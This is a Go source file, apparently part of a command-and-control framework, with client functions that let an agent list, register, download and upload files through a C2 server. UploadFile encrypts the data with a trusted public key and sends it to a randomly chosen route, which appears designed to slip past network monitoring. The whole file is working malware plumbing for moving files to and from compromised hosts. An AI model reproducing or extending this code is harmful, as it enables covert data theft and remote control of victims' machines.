package c2api

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net/http"

	cry "github.com/zarkones/xena-crypto"
)

func GetFiles() (files []File, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/files", nil)
	if err != nil {
		return nil, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return files, json.Unmarshal(respBody, &files)
}

type RequestFileUploadCtx struct {
	UploadedByAgentID string `json:"uploadedByAgentId"`
	OriginalName      string `json:"originalName"`
}

func RequestFileUpload(uploadedByAgentId, originalName string) (file File, err error) {
	reqCtx := RequestFileUploadCtx{
		UploadedByAgentID: uploadedByAgentId,
		OriginalName:      originalName,
	}

	jsonReqCtx, err := json.Marshal(&reqCtx)
	if err != nil {
		return file, err
	}

	req, err := http.NewRequest(http.MethodPut, *BaseURL+"/v1/files", bytes.NewReader(jsonReqCtx))
	if err != nil {
		return file, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return file, err
	}

	if resp.StatusCode != http.StatusCreated {
		return file, errors.Join(ErrUnexpectedStatusCode, errors.New(resp.Status))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return file, err
	}

	return file, json.Unmarshal(respBody, &file)
}

func DownloadFile(fileID string) (fileContent []byte, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/files/"+fileID, nil)
	if err != nil {
		return nil, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return respBody, nil
}

func UploadFile(fileID string, fileContent *[]byte) (err error) {
	if TrustedPubKey == nil {
		return ErrKeyIsNil
	}

	encryptedFileContent, err := cry.SecureWrap(TrustedPubKey, string(*fileContent))
	if err != nil {
		return err
	}

	endpointPaths := RouteMap[R_FILE_UPLOAD]
	endpointPath := randElem(&endpointPaths)
	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath+"/"+fileID, bytes.NewBufferString(encryptedFileContent))
	if err != nil {
		return err
	}

	resp, err := c.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return ErrUnexpectedStatusCode
	}

	return nil
}
